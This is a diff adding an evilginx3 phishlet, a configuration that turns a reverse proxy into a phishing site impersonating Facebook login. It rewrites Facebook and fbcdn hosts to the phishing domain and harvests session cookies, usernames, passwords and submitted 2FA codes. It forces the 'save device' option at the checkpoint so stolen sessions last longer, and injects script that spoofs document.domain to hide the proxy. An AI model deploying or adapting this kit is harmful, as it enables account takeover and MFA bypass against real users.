@@ -1,0 +1,91 @@
+# Facebook phishlet for evilginx3
+# Validate all sub_filters, auth_tokens, and js_inject against live traffic before use
+name: 'facebook'
+author: '@yourhandle'
+min_ver: '3.0.0'
+
+config:
+  proxy_hosts:
+    - {phish_sub: 'www', orig_sub: 'www', domain: 'facebook.com', session: true, is_landing: true, auto_filter: true}
+    - {phish_sub: 'm', orig_sub: 'm', domain: 'facebook.com', session: true, is_landing: false, auto_filter: true}
+    - {phish_sub: 'static', orig_sub: 'static.xx', domain: 'fbcdn.net', session: false, is_landing: false, auto_filter: true}
+    - {phish_sub: 'scontent', orig_sub: 'scontent.xx', domain: 'fbcdn.net', session: false, is_landing: false, auto_filter: true}
+
+  sub_filters:
+    - {triggers_on: 'www.facebook.com', orig_sub: 'www', domain: 'facebook.com', search: 'https://www.facebook.com', replace: 'https://www.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'www.facebook.com', orig_sub: 'm', domain: 'facebook.com', search: 'https://m.facebook.com', replace: 'https://m.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+    - {triggers_on: 'www.facebook.com', orig_sub: 'static', domain: 'fbcdn.net', search: 'static.xx.fbcdn.net', replace: 'static.{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+  auth_tokens:
+    - domain: '.facebook.com'
+      keys: ['c_user', 'xs', 'datr', 'sb', 'fr']
+
+  # auth_urls fire AFTER the full flow completes, including 2FA/checkpoint.
+  # We deliberately exclude the 2FA entry paths here so the session is only
+  # considered captured once the user lands on an authenticated destination.
+  auth_urls:
+    - '/home.php'
+    - '/?sk=welcome'
+
+  credentials:
+    username:
+      key: 'email'
+      search: '(.*)'
+      type: 'post'
+    password:
+      key: 'pass'
+      search: '(.*)'
+      type: 'post'
+    # Capture the 2FA code the user submits, useful for flow analysis.
+    custom:
+      - key: 'approvals_code'
+        search: '(.*)'
+        type: 'post'
+
+  login:
+    domain: 'www.facebook.com'
+    path: '/login'
+
+  force_post:
+    - path: '/login/device-based/regular/login/'
+      search:
+        - {key: 'login', search: '.*'}
+      force:
+        - {key: 'login', value: '1'}
+      type: 'post'
+    # Keep "remember browser" enabled through the checkpoint so the captured
+    # session cookies are long-lived rather than step-up-only.
+    - path: '/checkpoint/'
+      search:
+        - {key: 'name_action_selected', search: '.*'}
+      force:
+        - {key: 'name_action_selected', value: 'save_device'}
+      type: 'post'
+
+  js_inject:
+    - trigger_domains: ['www.facebook.com']
+      trigger_paths: ['/login', '/']
+      trigger_params: []
+      script: |
+        function fbStripDetect() {
+          try {
+            Object.defineProperty(document, 'domain', {
+              get: function() { return 'facebook.com'; },
+              configurable: true
+            });
+          } catch (e) {}
+        }
+        fbStripDetect();
+
+    # 2FA/checkpoint pages sometimes run extra integrity checks; keep this
+    # injection minimal and targeted to avoid breaking the code-entry form.
+    - trigger_domains: ['www.facebook.com']
+      trigger_paths: ['/checkpoint/', '/two_factor/']
+      trigger_params: []
+      script: |
+        function fbCheckpointPassthrough() {
+          // Placeholder for any checkpoint-specific neutralization discovered
+          // during :debug. Identify the exact integrity check before adding
+          // overrides here so the 2FA form keeps functioning.
+        }
+        fbCheckpointPassthrough();
